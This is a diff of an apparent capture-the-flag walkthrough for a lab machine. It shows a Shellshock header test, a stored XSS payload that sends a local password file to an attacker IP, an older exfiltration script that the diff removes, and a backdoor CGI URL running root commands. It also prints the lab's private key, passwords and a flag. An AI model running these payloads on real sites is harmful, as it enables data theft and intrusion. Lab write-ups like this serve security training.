@@ -16,10 +16,7 @@ Please allow the machine 2 - 3 minutes to boot up.</p>
 <h3 align="left">Answer the question below</h3>
 
 > 1.1. <em>What is the user flag?</em><br><a id='1.1'></a>
->> <strong><code>_______________</code></strong><br>
-
-> 1.2. <em>What is the root flag?</em><br><a id='1.2'></a>
->> <strong><code>_______________</code></strong><br>
+>> <strong><code>1ca4eb201787acbfcf9e70fca87b866a</code></strong><br>
 
 <h3>nmap</h3>
 
@@ -94,7 +91,7 @@ Hey I just removed the old user mike because that account was compromised and fo
 <h3>gobuster</h3>
 
 ```bash
-:~# gobuster dir -u http://TargetIP0/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -t 100
+:~# gobuster dir -u http://TargetIP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -t 100
 ...
 /.php                 (Status: 403) [Size: 277]
 /dir                  (Status: 403) [Size: 277]
@@ -124,82 +121,193 @@ Hey I just removed the old user mike because that account was compromised and fo
 /server-status        (Status: 403) [Size: 278]
 ```
 
-<h3>http://TargetIP/register.php</h3>
 
-<p>Registered researcher:pass</p>
+<h3>http://TargetIP</h3>
 
-![image](https://github.com/user-attachments/assets/6e502242-20ec-45ee-b6b6-8d4435fd9ce9)
+![image](https://github.com/user-attachments/assets/4b3d9a2b-5441-4d68-b0b1-00b596a836e4)
 
-![image](https://github.com/user-attachments/assets/cee67e85-c4c4-4ef3-bce2-b78a404eeb95)
+<h3>http://TargetIP/blog.php</h3>
 
-![image](https://github.com/user-attachments/assets/ef44bd26-3845-404c-9ed5-a364bed1f02f)
+![image](https://github.com/user-attachments/assets/26b2d943-df5e-4e79-917e-33f953657ac5)
 
-![image](https://github.com/user-attachments/assets/3a7c21f0-6465-4d36-8d58-4000dcd4155c)
+<p>https://hacktricks.boitatech.com.br/pentesting/pentesting-web/cgi</p>
 
-![image](https://github.com/user-attachments/assets/82e43874-d8d6-4a54-bdde-6d6aca0b8f7e)
+![image](https://github.com/user-attachments/assets/a7f4309c-9515-4881-b65f-306f3153f450)
 
-<h3>Payload</h3>
+![image](https://github.com/user-attachments/assets/ac05c986-8a19-425b-a8c8-88b76911bdd3)
+
+<h3>Tested Reflected</h3>
 
 ```bash
-<script>alert("Testing!!!")</script>
+~/WhyHackMe# curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://TargetIP/cgi-bin/admin.cgi 2>/dev/null| grep 'VULNERABLE'
 ```
 
-![image](https://github.com/user-attachments/assets/b27965dd-0880-4d18-b853-eb66f8fb1e87)
-
-
-<h3>Script: <code>hey.js</code></h3>
+<h3> Tested Blind with sleep</h3>
 
 ```bash
-var url = "http://127.0.0.1/dir/pass.txt";
-var attacker = "http://10.10.101.19:8000";
-var xhr  = new XMLHttpRequest();
-xhr.onreadystatechange = function() {
-    if (xhr.readyState == XMLHttpRequest.DONE) {
-        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
-    }
-}
-xhr.open('GET', url, true):
-xhr.send(null);
-
+:~# :~/WhyHackMe# curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://TargetIP/cgi-bin/admin.cgi
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>403 Forbidden</title>
+</head><body>
+<h1>Forbidden</h1>
+<p>You don't have permission to access this resource.</p>
+<hr>
+<address>Apache/2.4.41 (Ubuntu) Server at TargetIP Port 80</address>
+</body></html>
 ```
 
-<h3>HTTP server</h3>
+<br>
+
+<p>
+    
+- registered a username = <code><script>alert(1)</script></code> and a password = <code>pass</code><br>
+- logged in login.php<br>
+- sent a comment in blog.php</p>
+
+![image](https://github.com/user-attachments/assets/d3e3580b-e326-444e-b403-948ae6060251)
+
+![image](https://github.com/user-attachments/assets/1768b2c3-3d72-4343-b26d-596989f91f90)
+
+<p>
+    
+- set up an http.server<br>
 
 ```bash
-:~# python3 -m http.server
+:~/WhyHackMe# python3 -m http.server
+```
+
+- registered a new user = username <code><script>fetch("http://127.0.0.1/dir/pass.txt").then(response => response.text()).then(data => fetch("http://10.10.174.109:8000/?data=" + encodeURIComponent(data)));</script></code> and password = <code>pass</code><br>
+- logged in in login.php<br>
+- sent a comment in blog.php</p>
+
+```bash
+:~/WhyHackMe# python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+TargetIP - - [30/Jun/2025 ...] "GET /?data=jack%3AWhyIsMyPasswordSoStrongIDK%0A HTTP/1.1" 200 -
 ```
 
-<h3>Listener</h3>
+<p>jack : WhyIsMyPasswordSoStrongIDK</p>
 
 ```bash
-~# nc -lnvp 4444
-Listening on 0.0.0.0 4444
+:~/WhyHackMe# ssh jack@TargetIP
+...
+jack@ubuntu:~$ cat user.txt
+1ca4eb201787acbfcf9e70fca87b866a
 ```
 
-<h3>Payload</h3>
+<br>
+
+> 1.2. <em>What is the root flag?</em><br><a id='1.2'></a>
+>> <strong><code>_______________</code></strong><br>
+
 
 ```bash
-<script src="http://10.10.101.19.63.57/hey.js"></script>
+jack@ubuntu:~$ sudo -l
+[sudo] password for jack: 
+Matching Defaults entries for jack on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jack may run the following commands on ubuntu:
+    (ALL : ALL) /usr/sbin/iptables
 ```
 
-![image](https://github.com/user-attachments/assets/67736691-aa06-411a-8bf5-0adfbb89d3fa)
-
-![image](https://github.com/user-attachments/assets/cb473289-b1f0-4c36-b678-815f7a4e4646)
-
-![image](https://github.com/user-attachments/assets/a6b35ef4-a436-44c2-b927-7622e3d9e3ad)
-
-
-<h3>http://TargetIP/register.php</h3>
-
-<p>Registered practitioner:pass</p>
-
-<h3>Payload</h3>
+<p>port 41312</p>
 
 ```bash
-<script>fetch("http://127.0.0.1/dir/pass.txt").then(x => x.text()).then(y => fetch("http://10.10.101.19:8000",  {method: "POST", body:y}));</script>
+jack@ubuntu:/home$ sudo /usr/sbin/iptables -L -n --line-numbers
+Chain INPUT (policy ACCEPT)
+num  target     prot opt source               destination         
+1    DROP       tcp  --  0.0.0.0/0            0.0.0.0/0            tcp dpt:41312
+...
 ```
 
-![image](https://github.com/user-attachments/assets/db67789f-dcb4-4af2-8181-782a55510956)
+```bash
+jack@ubuntu:/opt$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+AttackIP - - [30/Jun/2025 ....] "GET /capture.pcap HTTP/1.1" 200 -
+```
+
+
+```bash
+:~/WhyHackMe# wget http://10.10.81.8:8000/capture.pcap
+...
+```
+
+
+<p>port 41312</p>
+
+![image](https://github.com/user-attachments/assets/ae1f6bf5-e82c-4abb-a615-77907155c03b)
+
+![image](https://github.com/user-attachments/assets/42e50117-875f-4d47-b9ed-597f318de7de)
+
+<p>TLS</p>
+
+![image](https://github.com/user-attachments/assets/f93c3458-5d5c-4888-86c1-a1a618bb9abf)
+
+![image](https://github.com/user-attachments/assets/6436c704-5407-4ee2-8ae5-e7ce9353a723)
+
+```bash
+jack@ubuntu:/etc/apache2/certs$ cat apache.key
+-----BEGIN PRIVATE KEY-----
+MIIJQgIBADANBgkqhkiG9w0BAQEFAASCCSwwggkoAgEAAoICAQDOkNCaT0sHHS1X
+/IjqenvRFL5xjYQz38NZ/uZJYtaYTHHZmzE2mXTU4J1rXlKFVeQ6t3j3BenyxGGI
+z/EDQqPoxO7D10PzSw5dvGGUcnYA/hgp5XPUijvtHMcMtqlupI15EMel9Cf0aFMY
+U1O2nM0YoRpviZn+3rQ7SOzBr+zvo3pmZHe4BK9EO/rnbjmZgWkEa52wgNvy5Lni
+hGt9jx2YtTGJtpEqc+ytb6EapU7LSrwDem05DOc/35NvHO+WX/fboN1+l9WVXwxP
+dTBx/z5TykrPKjSSTBwzIVjqSmJS82m6NV1278P7JL/qGIBJcJq+AOZ9S0M9WsWs
+LVApqvqwT4gtgGoPH0mfYlkcJqFi/raM8GhFqYthAne1L73ZbGeCelKi0bjp1Ixd
+0EE1PHrF+Cvr84cke6RXJWA6SCW1y6Xug3ltJhFSagsINzpIqBj6AfHuGPyG3MNO
+b9wIpHBL0duw1nEnJN2WNUfdIqB+41/Ihn/m8fbb3KyR7UbxE9iCto1/iMvi/DfW
+HioVKPOlWtrGBXtABjHnVSSzDciMq4EyM+FNqUauwYebONs95FOIdJX6zssXxlze
+3ZsyBuCAhy5UEOHCm3Au7NQgjGY+9jx3MXOEMfZiMGUOcTE2e/0+pUV7cLQNQbFP
+lWXZ+CB/czyvgthZLKDUa8zXqObzpQIDAQABAoICAAkOLiblnPtl2wwFZRcqYW0s
+BKFDu+zuPUkftIa5D4FDsKYCeKjVF1sRsbT4QJPZzRSJ4IKrvrLGyyPNQdqLvFXC
+9FifgjoTK0EOthRk5Cls+jAz/9zsZm4hmdRD2a+hBRaulqH+zxWW0TW6yWuy+ga/
+YUJMfPTAXJRQwRhIlxF2UDJW6yyk/+301y34FgxVsP3hndsT+xBt2HxGo9OwR3Lf
+Vpmb6Ec9J73+q8hYQNkGoLFiV5FtsGGLcpInaZVlBZ+aMLuQ+mr+7LI7B/GnZ9sS
+fi8QwZc8QOw45QX4VtEeHJ9uIXfKUQQce1FO26jch9wWfAQ4HW1+IjZHEkGRXkXy
+Ow8SatGIXev8fMoGgFc4M/QRQUPOlAevsWPwKD8o6gaggDU1DPiqDb1yBLPFaBGJ
+STTjvO1LFtpHgNNKvD9fPVQKLZ7poSxnHuEwt9+yyQWvufVB5eDj8IncZz5FCs52
+uctxmyHKzjzTRuytQBk70g9xIVOS8bsVK9nojxAlh3ywyHdykIUEzqrZgTxAGZ+e
+/TpSIpeAvKRbM0HZ+ePyEU33p9FYGNvLGLUEuXoUDA2Tla4d/zXxnBVviva4AKhh
+vbLzkHpp0JQoIVjgZQUBqICk9yG3uA/dKRG+w4zkkdowvFFsaosiwRlCcOc+Ihj7
+/iOngWUOfGKOkIJv8Q0hAoIBAQDsj+dl8xB2fzvxMA/L1Vff/VxLqsnQUnltXQ14
+...
+tc0d+it0CVQSko3I6qN535x1KzlFkGy8i/P+nvBeCzbccV9fakubxk68OMmgflWA
+tBlKzXdlqLoHbWLptdcQhV8pisZrLhd42C+YFb+LY34EQ3MSq/JTPQab73Zxb1qY
+8zgwXPatVQA2vA1aN1A1anOcmGZPQg==
+-----END PRIVATE KEY-----
+jack@ubuntu:/etc/apache2/certs$ 
+```
+
+```bash
+jack@ubuntu:/var/www/html$ cat config.php
+<?php
+$servername = "localhost";
+$username = "root";
+$password = "MysqlPasswordIsPrettyStrong";
+$dbname = "commentDB";
+?>
+jack@ubuntu:/var/www/html$ 
+```
+
+![image](https://github.com/user-attachments/assets/cd29fdf1-fb58-49ae-a31a-caff8d11269b)
+
+![image](https://github.com/user-attachments/assets/6840fe3d-3214-4de3-9177-cb8f60ddb742)
+
+![image](https://github.com/user-attachments/assets/46a26209-e0b8-4b6f-ac37-b27205adaf0d)
+
+GET /cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id HTTP/1.1\r\n
+
+/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id
+
+![image](https://github.com/user-attachments/assets/3fc64eea-7642-4169-845d-74c87782b882)
+
+![image](https://github.com/user-attachments/assets/b97c0e41-e494-44cb-8df7-8ef6fee432c3)
+
+<p>https://10.10.110.79:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=sudo%20cat%20/root/root.txt</p>p>
+
+![image](https://github.com/user-attachments/assets/bb94c873-cb8e-450f-96ef-0fb9c171476a)
 
 
